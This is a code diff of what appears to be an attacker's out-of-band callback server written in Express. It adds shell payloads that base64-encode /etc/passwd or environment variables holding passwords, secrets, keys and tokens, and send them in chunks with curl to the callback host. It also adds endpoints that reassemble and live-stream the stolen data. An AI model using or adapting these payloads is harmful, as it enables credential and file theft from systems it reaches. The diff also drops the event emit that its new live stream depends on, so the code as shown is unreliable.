@@ -4,13 +4,15 @@ import {
   addHit, getHits, clearHits, oobEvents,
   isRateLimited, generateToken, type OobHit,
 } from "../oob/oobStore.js";
+import {
+  addChunk, getSessions, clearSessions, getSession, dnsEvents, type DnsSession,
+} from "../oob/dnsReassembler.js";
 import { createLogger } from "../lib/logger.js";
 import { getOobCbBase } from "../lib/tunnelUrl.js";
 
 const log    = createLogger("oob");
 const router: IRouter = Router();
 
-/* ── Webhook forwarding (optional — set OOB_WEBHOOK_URL env var) ───── */
 const WEBHOOK_URL = (process.env["OOB_WEBHOOK_URL"] ?? "").trim();
 
 async function forwardToWebhook(hit: OobHit): Promise<void> {
@@ -27,7 +29,6 @@ async function forwardToWebhook(hit: OobHit): Promise<void> {
   }
 }
 
-/* ── Decode base64 data from hit ────────────────────────────────────── */
 function tryDecodeB64(raw: string): string {
   try {
     const decoded = Buffer.from(raw, "base64").toString("utf8");
@@ -48,6 +49,8 @@ function buildPolymorphicPayloads(base: string, token: string): Record<string, s
     cbHost  = u.hostname;
     cbPort  = u.port || (u.protocol === "https:" ? "443" : "80");
   } catch { /* keep defaults */ }
+
+  const dnsBase = base.replace(/\/oob\/cb$/, "/oob/dns-chunk");
 
   return {
     wget_pixel:
@@ -94,6 +97,12 @@ function buildPolymorphicPayloads(base: string, token: string): Record<string, s
 
     dns_lookup:
       `nslookup $(id|md5sum|cut -c1-16).${cbHost} 2>/dev/null & dig +short $(hostname|tr '.' '-').${cbHost} 2>/dev/null &`,
+
+    dns_chunk_passwd:
+      `f=$(base64 -w0 /etc/passwd 2>/dev/null||base64 /etc/passwd|tr -d '\\n'); t=$(( (${`\${#f}`}+54)/55 )); i=0; idx=0; while [ $i -lt ${`\${#f}`} ]; do chunk="${`\${f:$i:55}`}"; curl -sk "${dnsBase}/${token}/p/$idx/$t?d=$chunk" >/dev/null 2>&1; i=$((i+55)); idx=$((idx+1)); sleep 0.05; done`,
+
+    dns_chunk_env:
+      `f=$(env|grep -iE '(pass|secret|key|token|api|auth|db|jwt)'|base64 -w0 2>/dev/null); t=$(( (${`\${#f}`}+54)/55 )); i=0; idx=0; while [ $i -lt ${`\${#f}`} ]; do chunk="${`\${f:$i:55}`}"; curl -sk "${dnsBase}/${token}/e/$idx/$t?d=$chunk" >/dev/null 2>&1; i=$((i+55)); idx=$((idx+1)); sleep 0.05; done`,
   };
 }
 
@@ -149,20 +158,16 @@ function receiveCallback(req: Request, res: Response): void {
       Object.entries(req.headers as Record<string, string | string[] | undefined>)
         .map(([k, v]) => [k, Array.isArray(v) ? v.join(", ") : (v ?? "")]),
     ),
-    receivedAt: new Date().toISOString(),
+    receivedAt:  new Date().toISOString(),
     decodedData: rawData ? tryDecodeB64(rawData) : undefined,
   };
 
   addHit(hit);
-  oobEvents.emit("hit", hit);
   log.info({ token: token.slice(0, 8), sourceIp, method: req.method }, "oob: callback received");
-
-  // Forward to external webhook if configured
   void forwardToWebhook(hit);
 
-  // Send a pixel / 204 response to avoid triggering error detection in payloads
   res.setHeader("Content-Type", "image/gif");
-  res.send(Buffer.from("R0lGODlhAQABAIAAAAUEBAAAACwAAAAAAQABAAACAkQBADs=", "base64")); // 1×1 transparent GIF
+  res.send(Buffer.from("R0lGODlhAQABAIAAAAUEBAAAACwAAAAAAQABAAACAkQBADs=", "base64"));
 }
 
 router.get("/oob/cb/:token", receiveCallback);
@@ -182,7 +187,7 @@ router.delete("/oob/hits", (_req: Request, res: Response) => {
   res.json({ ok: true });
 });
 
-/* ── GET /oob/stats — hit statistics ────────────────────────────────── */
+/* ── GET /oob/stats ─────────────────────────────────────────────────── */
 router.get("/oob/stats", (_req: Request, res: Response) => {
   const hits = getHits();
   const byToken: Record<string, number> = {};
@@ -190,47 +195,149 @@ router.get("/oob/stats", (_req: Request, res: Response) => {
   let   withData = 0;
 
   for (const h of hits) {
-    byToken[h.token]    = (byToken[h.token]    ?? 0) + 1;
-    byIp[h.sourceIp]    = (byIp[h.sourceIp]    ?? 0) + 1;
-    if (h.decodedData)   withData++;
+    byToken[h.token]  = (byToken[h.token]  ?? 0) + 1;
+    byIp[h.sourceIp]  = (byIp[h.sourceIp]  ?? 0) + 1;
+    if (h.decodedData) withData++;
   }
 
   res.json({
-    total:       hits.length,
+    total:             hits.length,
     withData,
-    uniqueTokens: Object.keys(byToken).length,
-    uniqueIPs:    Object.keys(byIp).length,
+    uniqueTokens:      Object.keys(byToken).length,
+    uniqueIPs:         Object.keys(byIp).length,
     byToken,
     byIp,
     webhookConfigured: Boolean(WEBHOOK_URL),
   });
 });
 
-/* ── GET /oob/hits/stream — SSE live stream of incoming hits ─────────── */
+/* ── GET /oob/hits/stream — SSE live stream of HTTP hits ─────────────── */
 router.get("/oob/hits/stream", (req: Request, res: Response) => {
   res.setHeader("Content-Type",  "text/event-stream");
   res.setHeader("Cache-Control", "no-cache");
   res.setHeader("Connection",    "keep-alive");
   res.flushHeaders();
 
-  // Drain existing hits first
-  const existing = getHits();
-  for (const h of existing) {
-    res.write(`data: ${JSON.stringify(h)}\n\n`);
+  for (const h of getHits()) {
+    res.write(`event: hit\ndata: ${JSON.stringify(h)}\n\n`);
   }
 
   const onHit = (hit: OobHit) => {
-    try { res.write(`data: ${JSON.stringify(hit)}\n\n`); } catch { /* client disconnected */ }
+    try { res.write(`event: hit\ndata: ${JSON.stringify(hit)}\n\n`); } catch { /* client gone */ }
   };
-  oobEvents.on("hit", onHit);
+  const onCleared = () => {
+    try { res.write(`event: cleared\ndata: {}\n\n`); } catch { /* client gone */ }
+  };
 
-  // Keep-alive ping every 25s
+  oobEvents.on("hit",     onHit);
+  oobEvents.on("cleared", onCleared);
+
   const ping = setInterval(() => {
     try { res.write(": ping\n\n"); } catch { clearInterval(ping); }
   }, 25_000);
 
   req.on("close", () => {
-    oobEvents.off("hit", onHit);
+    oobEvents.off("hit",     onHit);
+    oobEvents.off("cleared", onCleared);
+    clearInterval(ping);
+  });
+});
+
+/* ════════════════════════════════════════════════════════════════════════
+   DNS CHUNK REASSEMBLY
+   Receives HTTP-encoded DNS-exfil chunks and reassembles them in real-time.
+   URL pattern: GET|POST /oob/dns-chunk/:token/:prefix/:idx/:total?d=<b64chunk>
+   ════════════════════════════════════════════════════════════════════════ */
+
+router.get("/oob/dns-chunk/:token/:prefix/:idx/:total", receiveDnsChunk);
+router.post("/oob/dns-chunk/:token/:prefix/:idx/:total", receiveDnsChunk);
+
+function receiveDnsChunk(req: Request, res: Response): void {
+  const sourceIp = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim()
+    || req.socket.remoteAddress || "?";
+
+  if (isRateLimited(sourceIp)) {
+    res.status(429).send("rate limited");
+    return;
+  }
+
+  const p      = req.params as Record<string, string>;
+  const token  = p["token"]  ?? "";
+  const prefix = p["prefix"] ?? "x";
+  const idx    = parseInt(p["idx"]   ?? "0", 10);
+  const total  = parseInt(p["total"] ?? "1", 10);
+  const chunk  = (req.query as Record<string, string>)["d"]
+              ?? (req.query as Record<string, string>)["chunk"]
+              ?? (typeof req.body === "string" ? req.body.trim() : "");
+
+  if (!token || !chunk || isNaN(idx) || isNaN(total) || total < 1) {
+    res.status(400).json({ error: "token, d, idx, total required" });
+    return;
+  }
+
+  const session = addChunk(token, prefix, idx, total, chunk);
+  log.info(
+    { token: token.slice(0, 8), prefix, idx, total, received: session.received, complete: session.complete },
+    "oob: dns chunk received",
+  );
+
+  res.setHeader("Content-Type", "image/gif");
+  res.send(Buffer.from("R0lGODlhAQABAIAAAAUEBAAAACwAAAAAAQABAAACAkQBADs=", "base64"));
+}
+
+/* ── GET /oob/dns-sessions — list all reassembly sessions ─────────── */
+router.get("/oob/dns-sessions", (_req: Request, res: Response) => {
+  const sessions = getSessions();
+  res.json({ count: sessions.length, sessions });
+});
+
+/* ── GET /oob/dns-sessions/:key — get single session ──────────────── */
+router.get("/oob/dns-sessions/:key", (req: Request, res: Response) => {
+  const key = (req.params as Record<string, string>)["key"] ?? "";
+  const session = getSession(decodeURIComponent(key));
+  if (!session) { res.status(404).json({ error: "not found" }); return; }
+  res.json(session);
+});
+
+/* ── DELETE /oob/dns-sessions — clear all sessions ─────────────────── */
+router.delete("/oob/dns-sessions", (_req: Request, res: Response) => {
+  clearSessions();
+  res.json({ ok: true });
+});
+
+/* ── GET /oob/dns-sessions/stream — SSE live stream of DNS events ─── */
+router.get("/oob/dns-sessions/stream", (req: Request, res: Response) => {
+  res.setHeader("Content-Type",  "text/event-stream");
+  res.setHeader("Cache-Control", "no-cache");
+  res.setHeader("Connection",    "keep-alive");
+  res.flushHeaders();
+
+  for (const s of getSessions()) {
+    res.write(`event: session\ndata: ${JSON.stringify(s)}\n\n`);
+  }
+
+  const onChunk = (data: unknown) => {
+    try { res.write(`event: chunk\ndata: ${JSON.stringify(data)}\n\n`); } catch { /* gone */ }
+  };
+  const onComplete = (session: DnsSession) => {
+    try { res.write(`event: complete\ndata: ${JSON.stringify(session)}\n\n`); } catch { /* gone */ }
+  };
+  const onCleared = () => {
+    try { res.write(`event: cleared\ndata: {}\n\n`); } catch { /* gone */ }
+  };
+
+  dnsEvents.on("chunk",    onChunk);
+  dnsEvents.on("complete", onComplete);
+  dnsEvents.on("cleared",  onCleared);
+
+  const ping = setInterval(() => {
+    try { res.write(": ping\n\n"); } catch { clearInterval(ping); }
+  }, 25_000);
+
+  req.on("close", () => {
+    dnsEvents.off("chunk",    onChunk);
+    dnsEvents.off("complete", onComplete);
+    dnsEvents.off("cleared",  onCleared);
     clearInterval(ping);
   });
 });
